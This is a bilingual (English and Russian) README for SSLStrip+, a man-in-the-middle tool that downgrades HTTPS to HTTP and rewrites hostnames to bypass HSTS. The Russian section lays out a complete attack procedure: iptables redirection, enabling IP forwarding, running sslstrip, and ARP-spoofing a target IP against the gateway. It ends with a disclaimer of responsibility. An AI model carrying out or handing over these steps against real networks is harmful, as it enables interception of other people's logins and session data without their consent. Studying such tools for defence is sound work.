SSLStrip+
=========

This is a new version of [Moxie´s SSLstrip] (http://www.thoughtcrime.org/software/sslstrip/) with the new feature to avoid HTTP Strict Transport Security (HSTS) protection mechanism.  
  
This version changes HTTPS to HTTP as the original one plus the hostname at html code to avoid HSTS. Check my slides at BlackHat ASIA 2014 [OFFENSIVE: EXPLOITING DNS SERVERS CHANGES] (http://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) for more information.  
  
For this to work you also need a DNS server that reverse the changes made by the proxy, you can find it at https://github.com/LeonardoNve/dns2proxy.


Demo video at: http://www.youtube.com/watch?v=uGBjxfizy48

Ru:

Это новая версия [Moxie´s SSLstrip] (http://www.thoughtcrime.org/software/sslstrip/) с новой возможностью обхода механизма защиты HTTP Strict Transport Security (HSTS).  
  
Эта версия меняет HTTPS на HTTP, как и оригинальная версия, плюс имя хоста в html-коде, чтобы избежать HSTS. Посмотрите мои слайды на BlackHat ASIA 2014 [OFFENSIVE: EXPLOITING DNS SERVERS CHANGES] (http://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) для получения дополнительной информации.  
  
Для того чтобы это работало, вам также нужен DNS-сервер, который обращает изменения, сделанные прокси, вы можете найти его по адресу https://github.com/LeonardoNve/dns2proxy.

Установка:
(Всё делать под root!)
1. Рекомендуется использовать python 2.7.18 (установка на kali: https://www.kali.org/docs/general-use/using-eol-python-versions/)
2. pip install -r requirements.txt
3. python sslstrip.py

Использование (взято: https://kali.tools/?p=177):
1. Сбросить все правила для цепей.
iptables --flush (Выполнять и при завершении атаки)

2. Переключите вашу машину в режим пересылки (форвардинга).
echo "1" > /proc/sys/net/ipv4/ip_forward

3. Настройте iptables для редиректа HTTP трафика на sslstrip.
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <listenPort>

4. Запустите sslstrip.
sslstrip.py -l <listenPort>

5. Запустите arpspoof, чтобы убедить сети, что им следует отправлять их трафик вам.
arpspoof -i <interface> -t <targetIP> <gatewayIP>
  
(Я не несу ответственности за ваши действия! Я за использование данного инструмента в образовательных целях!)
